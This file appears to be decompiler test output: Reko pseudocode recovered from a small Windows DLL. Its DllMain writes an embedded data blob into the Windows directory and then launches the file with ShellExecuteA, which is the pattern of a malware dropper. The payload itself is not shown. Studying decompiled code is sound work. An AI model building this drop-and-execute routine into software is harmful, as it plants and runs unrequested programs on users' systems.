// subject_reko_0000000000003000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_4 g_t10003000 = 0x49D6; // 10003000
void g_v10003004 = ??void??; // 10003004
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t10001000 = 'o'; // 10001000
CHAR g_t10001261 = '\\'; // 10001261
word32 g_dw1000146C = 0x14B8; // 1000146C
word32 g_dw10001470 = 0x14C6; // 10001470
word32 g_dw10001474 = 0x14D4; // 10001474
word32 g_dw10001478 = 5356; // 10001478
word32 g_dw1000147C = 0x14F8; // 1000147C
word32 g_dw10001484 = 0x1512; // 10001484
<anonymous> * __imp__CloseHandle = &g_t14B8; // 1000148C
<anonymous> * __imp__CreateFileA = &g_t14C6; // 10001490
<anonymous> * __imp__GetWindowsDirectoryA = &g_t14D4; // 10001494
<anonymous> * __imp__WriteFile = &g_t14EC; // 10001498
<anonymous> * __imp__lstrcatA = &g_t14F8; // 1000149C
<anonymous> * __imp__ShellExecuteA = &g_t1512; // 100014A4
// 10001530: Register Eq_2 DllMain(Stack Eq_3 hModule, Stack Eq_4 dwReason, Stack Eq_5 lpReserved)
Eq_2 DllMain(Eq_3 hModule, Eq_4 dwReason, Eq_5 lpReserved)
{
	if (dwReason == 0x01)
	{
		GetWindowsDirectoryA(&g_t10001610, 0x0400);
		lstrcatA(&g_t10001610, &g_t10001261);
		if (fn1000158A(&g_t10001610) != 0x00)
			ShellExecuteA(null, &g_t10001000, &g_t10001610, null, null, 0x00);
	}
	return 0x01;
}

// 1000158A: Register word32 fn1000158A(Stack Eq_19 dwArg04)
// Called from:
//      DllMain
word32 fn1000158A(Eq_19 dwArg04)
{
	Eq_4 tLoc08;
	word32 ebx_15 = 0x00;
	Eq_3 eax_32 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x00, null);
	if (eax_32 != (void *) ~0x00)
	{
		WriteFile(eax_32, &g_v10003004, g_t10003000, &tLoc08, null);
		CloseHandle(eax_32);
		ebx_15 = 0x01;
	}
	return ebx_15;
}

CHAR g_t10001610 = '\0'; // 10001610
